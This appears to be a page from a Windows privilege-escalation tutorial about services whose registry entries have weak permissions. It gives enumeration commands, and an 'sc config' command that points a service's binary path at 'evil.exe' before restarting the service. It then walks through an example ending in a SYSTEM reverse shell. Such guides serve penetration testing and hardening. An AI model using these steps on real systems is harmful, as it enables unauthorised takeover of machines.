# Registry Permissions

System services are typically executed with high integrity under the SYSTEM account. Additionally, they are often installed by third-party applications that may not adequately consider security measures, leaving potential vulnerabilities that attackers can exploit.

In some cases, services fail to properly restrict permissions on configuration registry entries created during installation. If an attacker is able to manipulate these registry entries, they could change the reference to the executable binary, allowing them to run malicious code and potentially escalate privileges.

## Service Registry

The following PowerShell script automatically checks if the user has permission to modify service registry entries.

> [!NOTE]
> This script requires the auxiliary function [[ModPathCheck]].

```powershell
ls HKLM:\SYSTEM\CurrentControlSet\Services\ | ForEach-Object { if(ModifiablePath
$_.PSPath){$_.PSPath}}
```

It is also possible to manually check using CMD, but the use of Microsoft Sysinternals tools is necessary to check permissions on the registry entries. You can find the Sysinternals suite [here](https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite/).

```batch
:: List all services
wmic service list brief

:: Check registry permissions
accesschk.exe /accepteula -kdqv "HKLM\SYSTEM\CurrentControlSet\Services\[Service_Name]"
```

### Attack

If the registry path can be modified, the attacker can change the path of the binary to be executed, causing the service to start with malicious code.

```batch
:: Change the path to a malicious binary
sc config [Service_Name] binpath= "cmd \c C:\evil.exe"

:: Restart the service
net stop [Service_Name] && net start [Service_Name]
```

## Example

**First, copy and paste to load the auxiliary function.**

![](https://daniel10barredo.github.io/PrivEscAssist_Windows/media/imag/services/regPerm_1.png)

Next, use the small script to list all service registry entries and check if the current user can modify them.

![](https://daniel10barredo.github.io/PrivEscAssist_Windows/media/imag/services/regPerm_2.png)

This shows a service named **regsvc** with weak permissions on the registry. We can then inspect this registry entry to review its configuration.

![](https://daniel10barredo.github.io/PrivEscAssist_Windows/media/imag/services/regPerm_3.png)

Next, we will create a reverse shell and manipulate the registry to point to our reverse shell executable.

![](https://daniel10barredo.github.io/PrivEscAssist_Windows/media/imag/services/regPerm_4.png)

Finally, we manually start the service using the following command.

```batch
net start regsvc
```

Within seconds, we establish a reverse shell connection running as SYSTEM.

![](https://daniel10barredo.github.io/PrivEscAssist_Windows/media/imag/services/regPerm_5.png)
